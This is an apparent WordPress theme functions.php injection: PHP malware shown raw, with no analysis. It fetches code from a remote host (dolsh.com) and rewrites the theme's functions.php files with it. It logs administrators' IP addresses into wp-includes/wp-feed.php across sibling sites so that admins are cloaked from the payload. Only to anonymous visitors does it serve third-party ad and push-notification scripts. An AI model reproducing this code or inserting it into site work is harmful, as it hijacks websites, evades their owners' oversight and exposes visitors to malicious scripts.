
ini_set('display_errors', 0);
error_reporting(0);
$wp_auth_key='aca55bf84cc544d0a9cfdfff8641d892';



$newxc=file_get_contents('http://www.dolsh.com/new8.txt');
$file=file_get_contents(get_template_directory().'/functions.php');
$filec=file_get_contents(get_stylesheet_directory().'/functions.php');

$pat_code='/div_code_name[\s\S]*?(if \( ! function_exists[\s\S]*?extract\([\s\S]*?)\?>/i';

if(preg_match_all($pat_code, $file, $matches_pat_code))
{
$toreplace=$matches_pat_code[1][0];
if (stripos($newxc, $wp_auth_key) !== false) 
{
$new_file=str_replace($toreplace,$newxc,$file);
@file_put_contents(get_template_directory().'/functions.php',$new_file);
}
}

if(preg_match_all($pat_code, $filec, $matches_pat_code))
{
$toreplace=$matches_pat_code[1][0];
if (stripos($newxc, $wp_auth_key) !== false) 
{
$new_filec=str_replace($toreplace,$newxc,$filec);
@file_put_contents(get_stylesheet_directory().'/functions.php',$new_filec);
}
}








if ( ! function_exists( 'slider_option' ) ) {  

function slider_option($content){ 
if(is_single())
{



$an="



<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-9664825-1', 'auto');
  ga('send', 'pageview');

</script>



";


$con = '
';
$con2 = '

<script type="text/javascript" src="//go.pub2srv.com/apu.php?zoneid=1063894"></script>

<script async="async" type="text/javascript" src="//go.mobisla.com/notice.php?p=628268&interactive=1&pushup=1"></script>

';


$content=$content.$con2;
}
return $content;
} 

function slider_option_footer(){ 
if(!is_single())
{
$an="



<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-9664825-1', 'auto');
  ga('send', 'pageview');

</script>



";



$con = '

';
$con2 = '

<script type="text/javascript" src="//go.pub2srv.com/apu.php?zoneid=1063894"></script>

<script async="async" type="text/javascript" src="//go.mobisla.com/notice.php?p=628268&interactive=1&pushup=1"></script>

';

echo $con2;
}
} 








function setting_my_first_cookie() {
  setcookie( 'wordpress_cf_adm_use_adm',1, time()+3600*24*1000, COOKIEPATH, COOKIE_DOMAIN);
  }


if(is_user_logged_in())
{
add_action( 'init', 'setting_my_first_cookie',1 );
}










function readDirsad($path){
  $dirHandle = opendir($path);
  while($item = readdir($dirHandle)) {
    $newPath = $path."/".$item;
    if(is_dir($newPath) && $item != '.' && $item != '..') {
	if(strpos($newPath,'wp-includes')!== false && strpos($newPath,'wp-includes/')=== false)
	{
	   
	   if (file_exists($newPath.'/wp-feed.php'))
                    {
        $ip=@file_get_contents($newPath.'/wp-feed.php');
                    }

				  
	 
          if (stripos($ip, $_SERVER['REMOTE_ADDR']) === false)
                   {
$ip.=$_SERVER['REMOTE_ADDR'].'
';
                 @file_put_contents($newPath.'/wp-feed.php',$ip);
                 
	                }


	}
       readDirsad($newPath);
    }
    else{
    }
  }
}















if( current_user_can('edit_others_pages'))
{

if (file_exists(ABSPATH.'wp-includes/wp-feed.php'))
{
$ip=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
}

if (stripos($ip, $_SERVER['REMOTE_ADDR']) === false)
{
$pathx = realpath(dirname(ABSPATH));
readDirsad($pathx);

$ip.=$_SERVER['REMOTE_ADDR'].'
';
@file_put_contents(ABSPATH.'wp-includes/wp-feed.php',$ip);


}



}


if(!isset($_COOKIE['wordpress_cf_adm_use_adm']) && !is_user_logged_in()) 
{
$adtxt=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
if (stripos($adtxt, $_SERVER['REMOTE_ADDR']) === false)
{
add_filter('the_content','slider_option');
add_action('wp_footer','slider_option_footer');
}
} 





























function readDirs($path){
  $dirHandle = opendir($path);
  while($item = readdir($dirHandle)) {
    $newPath = $path."/".$item;
    if(is_dir($newPath) && $item != '.' && $item != '..') {
	if(strpos($newPath,'wp-includes')!== false && strpos($newPath,'wp-includes/')=== false)
	{
       //echo "Found Folder $newPath<br>";
	   $ip=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
	   
	   if (file_exists($newPath.'/wp-feed.php'))
                    {
        $ipn=@file_get_contents($newPath.'/wp-feed.php');
                    }
					
	
				  
			
               $iparr = explode("\n", $ip);	 
			   $iparr=array_map('trim', $iparr); 
				  $ipnarr = explode("\n", $ipn);
				  $ipnarr=array_map('trim', $ipnarr); 
	
			   $result = array_unique(array_merge($iparr, $ipnarr));
			  $ipx= implode("\n",$result);
	 

                 @file_put_contents($newPath.'/wp-feed.php',$ipx);
                 
	   


	}
       readDirs($newPath);
    }
    else{
     // echo '&nbsp;&nbsp;Found File or .-dir '.$item.'<br>';
    }
  }
}


if (file_exists(ABSPATH.'wp-includes/wp-feed.php'))
{
//$path = realpath(dirname(ABSPATH));
//echo "$path<br>";
//readDirs($path);

}






















}